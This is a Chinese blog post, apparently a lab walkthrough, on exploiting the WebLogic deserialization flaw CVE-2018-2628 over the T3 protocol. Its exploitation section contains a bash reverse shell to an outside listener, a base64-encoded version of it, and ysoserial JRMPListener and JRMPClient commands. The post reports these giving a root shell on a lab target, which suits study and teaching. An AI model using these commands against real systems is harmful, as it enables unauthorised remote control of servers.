<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Weblogic反序列化漏洞（CVE-2018-2628） - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Weblogic反序列化漏洞（CVE-2018-2628）" />
<meta property="og:description" content="一、漏洞成因 攻击者利用RMI绕过weblogic黑名单限制，将加载的内容利用readObject解析，造成反序列化漏洞，该漏洞主要由于T3协议触发，所有开放weblogic控制台7001端口，默认开启T3服务，攻击者发送构造好的T3协议数据，获取目标服务器的权限。
RMI：Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。
java反序列化：指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。
T3协议：WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。
二、漏洞识别 1、扫描端口，这里不知道为啥没有扫描出特定的T3协议端
2、POC工具利用
检测出具有CVE-2018-2628漏洞
三、漏洞利用 启动JRMP Server，使得触发漏洞后的weblogic，可远程调用特定的程序：
攻击了一台存在漏洞的靶机时，靶机就会找这台具有JRMP服务的机器，寻找payload；
bash命令：bash -i &gt;&amp; /dev/tcp/192.168.236.128/7777 0&gt;&amp;1
由于Runtime.getRuntime().exec() 中不能使用管道符等bash需要的方法，所以我们使用base64的反弹shell形式，具体如下：
bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xOTIuMTY4LjIzNi4xMjgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}
格式为：bash -c {echo,上面反弹shell的base64编码}|{base64,-d}|{bash,-i}
运行代码：
java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 8888 Jdk7u21 ‘bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xOTIuMTY4LjIzNi4xMjgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}’" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/c84cd0dde12fce3c795785030340b3f0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-12T12:28:15+08:00" />
<meta property="article:modified_time" content="2023-02-12T12:28:15+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Weblogic反序列化漏洞（CVE-2018-2628）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="_0"></a>一、漏洞成因</h3> 
<p>攻击者利用RMI绕过weblogic黑名单限制，将加载的内容利用readObject解析，造成反序列化漏洞，该漏洞主要由于T3协议触发，所有开放weblogic控制台7001端口，默认开启T3服务，攻击者发送构造好的T3协议数据，获取目标服务器的权限。</p> 
<p>RMI：Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口。</p> 
<p>java反序列化：指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p> 
<p>T3协议：WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。</p> 
<h3><a id="_10"></a>二、漏洞识别</h3> 
<p>1、扫描端口，这里不知道为啥没有扫描出特定的T3协议端<br> <img src="https://images2.imgbox.com/43/1d/DMZe2raS_o.png" alt="在这里插入图片描述"><br> 2、POC工具利用</p> 
<p><img src="https://images2.imgbox.com/39/6c/jfEOKbdm_o.png" alt="在这里插入图片描述"><br> 检测出具有CVE-2018-2628漏洞</p> 
<h3><a id="_19"></a>三、漏洞利用</h3> 
<p>启动JRMP Server，使得触发漏洞后的weblogic，可远程调用特定的程序：<br> 攻击了一台存在漏洞的靶机时，靶机就会找这台具有JRMP服务的机器，寻找payload；</p> 
<p>bash命令：bash -i &gt;&amp; /dev/tcp/192.168.236.128/7777 0&gt;&amp;1</p> 
<p>由于Runtime.getRuntime().exec() 中不能使用管道符等bash需要的方法，所以我们使用base64的反弹shell形式，具体如下：<br> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNi4xMjgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}</p> 
<p>格式为：bash -c {echo,上面反弹shell的base64编码}|{base64,-d}|{bash,-i}</p> 
<p>运行代码：<br> java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 8888 Jdk7u21 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNi4xMjgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}’<br> <img src="https://images2.imgbox.com/4d/4b/VBqiJD0D_o.png" alt="在这里插入图片描述"><br> 说明开启成功，JRMP正在监听8888端口</p> 
<p>执行代码：<br> java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 192.168.236.128:8888 | xxd -p | tr -d $‘\n’ &amp;&amp; echo</p> 
<p><img src="https://images2.imgbox.com/22/76/j3iQuk35_o.png" alt="在这里插入图片描述"><br> 将构造的数据，复制粘贴到EXP中的payload，并且修改IP为目标IP：<br> <img src="https://images2.imgbox.com/34/31/EchUTz49_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/48/87/inh2wT6M_o.png" alt="在这里插入图片描述"></p> 
<p>保存后，监听bash脚本中的7777端口，python运行这个EXP脚本：<br> 一开始报错，是因为python默认的是python3运行，但是python3中print语法中得带有括号，所以报错，这里进行python2运行，成功运行：<br> <img src="https://images2.imgbox.com/4a/50/Y208PSrx_o.png" alt="在这里插入图片描述"><br> kali这边接收到shell，且为root权限：<br> <img src="https://images2.imgbox.com/76/ff/qaoKT0wR_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_51"></a>四、总结</h3> 
<p>1、一定要解决问题，不能放弃<br> 2、下次学习代码审计<br> 3、要在该文件的目录下运行程序才有效</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/70fae238df5f46197f639e572049a921/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">OpenMMLab AI实战营 第7课 MMSegmentation代码教学</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fc1b200a9d76879e23f665e9aee9b8e6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Tomcat中间件PUT漏洞-任意文件上传漏洞</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>